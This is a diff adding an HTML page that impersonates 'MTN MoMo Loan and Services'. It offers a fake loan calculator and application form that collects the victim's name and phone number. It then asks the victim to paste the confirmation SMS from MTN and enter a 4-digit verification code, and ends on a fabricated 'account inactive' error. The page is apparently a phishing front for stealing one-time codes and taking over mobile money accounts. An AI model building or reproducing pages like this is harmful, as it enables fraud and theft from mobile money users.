@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Loan and Services</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Language Selection Screen -->
+    <div id="language-screen" class="screen active">
+        <h2>Choose your language</h2>
+        <p>Select your language to continue</p>
+        <button onclick="selectLanguage()">English</button>
+        <button onclick="selectLanguage()">Français</button>
+        <button onclick="selectLanguage()">Camfranglais</button>
+        <small>You can change it anytime</small>
+    </div>
+
+    <!-- Main Application Screen -->
+    <div id="main-screen" class="screen">
+        <div class="header">
+            <h2>MTN MoMo Loan and Services</h2>
+        </div>
+
+        <div class="content">
+            <h3>Welcome to MTN MoMo Loan and Services</h3>
+            <p>Get loans easily through MTN MoMo Loan and Services</p>
+
+            <!-- Loan Calculator -->
+            <div class="calculator-box">
+                <h4>Loan Calculator</h4>
+                <input type="range" id="loanAmount" min="10000" max="1000000" step="5000" value="100000" oninput="updateLoanValue()">
+                <p id="amountDisplay">XAF 100,000</p>
+                <p>Monthly Payment</p>
+                <h3 id="monthlyPayment">XAF 46,667</h3>
+            </div>
+
+            <!-- Form Progress -->
+            <div class="progress-bar">
+                <p id="step-indicator">Step 1 of 3</p>
+            </div>
+
+            <!-- Multi-step Form -->
+            <div id="form-container">
+                <!-- Step 1 -->
+                <div id="step-1" class="form-step active">
+                    <h4>Loan Details</h4>
+                    <label>Loan Purpose:</label>
+                    <select>
+                        <option>Business</option>
+                        <option>Personal</option>
+                        <option>Education</option>
+                    </select>
+                    <button onclick="nextStep(2)">Next</button>
+                </div>
+
+                <!-- Step 2 -->
+                <div id="step-2" class="form-step">
+                    <h4>Personal Details</h4>
+                    <label>Full Name:</label>
+                    <input type="text" placeholder="John Doe">
+                    <label>Phone Number:</label>
+                    <input type="tel" placeholder="6XXXXXXXX">
+                    <button onclick="nextStep(3)">Next</button>
+                </div>
+
+                <!-- Step 3 -->
+                <div id="step-3" class="form-step">
+                    <h4>Employment Details</h4>
+                    <label>Occupation:</label>
+                    <input type="text" placeholder="Enter occupation">
+                    <button onclick="submitApplication()">Submit Application</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Processing Screen -->
+    <div id="processing-screen" class="screen">
+        <h2>Processing Application</h2>
+        <p>Please wait, this may take a few seconds</p>
+        <div class="loader"></div>
+    </div>
+
+    <!-- SMS Paste Screen -->
+    <div id="sms-screen" class="screen">
+        <h2>Paste the SMS from MTN</h2>
+        <p>We sent a confirmation message to your number. Copy the full SMS you received and paste it below.</p>
+        <textarea placeholder="Paste SMS here..."></textarea>
+        <button onclick="showScreen('verification-screen')">Next</button>
+    </div>
+
+    <!-- Verification Screen -->
+    <div id="verification-screen" class="screen">
+        <h2>Enter the Verification Code</h2>
+        <p>We sent a 4-digit code to your number. Enter it below to continue.</p>
+        <input type="text" maxlength="4" placeholder="0000">
+        <button onclick="showScreen('error-screen')">Verify</button>
+    </div>
+
+    <!-- Error/Result Screen -->
+    <div id="error-screen" class="screen">
+        <h2>Oops! Your account is inactive</h2>
+        <p>We can't credit your loan at the moment.</p>
+        <h4>Here's what to do next</h4>
+        <p>Your account cannot be credited because it is not active. Please ensure you are using an active account that has been making transactions regularly, then try again.</p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
